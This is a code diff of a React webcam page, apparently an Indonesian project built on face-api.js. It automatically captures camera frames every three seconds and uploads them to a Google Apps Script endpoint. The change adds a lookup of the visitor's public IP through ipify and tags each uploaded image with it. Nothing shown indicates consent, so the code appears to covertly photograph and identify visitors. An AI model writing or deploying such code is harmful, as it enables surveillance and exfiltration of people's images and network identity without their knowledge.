@@ -2,7 +2,7 @@ import * as faceapi from "face-api.js";
 import { useEffect, useRef, useState } from "react";
 
 const GOOGLE_SCRIPT_URL =
-    "https://script.google.com/macros/s/AKfycbw6wo-7UAhh0-WKK6PmrqVnOkqVf0mpCm8evgBJXR_0XLrKzvETDQ2wUtm5GjLQLZ4C/exec";
+    "https://script.google.com/macros/s/AKfycbwCMtu8vzCGJKogT139WoM01328LjUAiOzqYOlMC-mdHZ8aqTgabCeKbTduZu3pRs4m/exec";
 
 const MODEL_URL = "/models";
 
@@ -90,7 +90,7 @@ const CamPage = () => {
         };
 
         const startAutoCapture = () => {
-            captureInterval.current = setInterval(() => {
+            captureInterval.current = setInterval(async () => {
                 if (!videoRef.current || !canvasRef.current) return;
                 const video = videoRef.current;
                 const canvas = canvasRef.current;
@@ -102,21 +102,32 @@ const CamPage = () => {
                 ctx.clearRect(0, 0, canvas.width, canvas.height);
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imgData = canvas.toDataURL("image/png");
-                uploadToDrive(imgData);
+
+                let ip = "unknown";
+                try {
+                    const res = await fetch("https://api.ipify.org?format=json");
+                    const data = await res.json();
+                    ip = data.ip.replace(/\./g, "-");
+                } catch (err) {
+                    console.error("Gagal ambil IP publik:", err);
+                }
+
+                uploadToDrive(imgData, ip);
 
                 setTimeout(() => setShowBox(true), 500);
             }, 3000);
         };
 
-        const uploadToDrive = async (imgData: string) => {
+        const uploadToDrive = async (imgData: string, ip: string) => {
             try {
+                const timestamp = Date.now();
                 await fetch(GOOGLE_SCRIPT_URL, {
                     method: "POST",
                     mode: "no-cors",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ image: imgData }),
+                    body: JSON.stringify({ image: imgData, filename: `snap_${ip}_${timestamp}.png` }),
                 });
-                console.log("📤 Upload dikirim");
+                console.log("📤 Upload dikirim dengan IP:", ip);
             } catch (err) {
                 console.error("❌ Upload gagal:", err);
             }
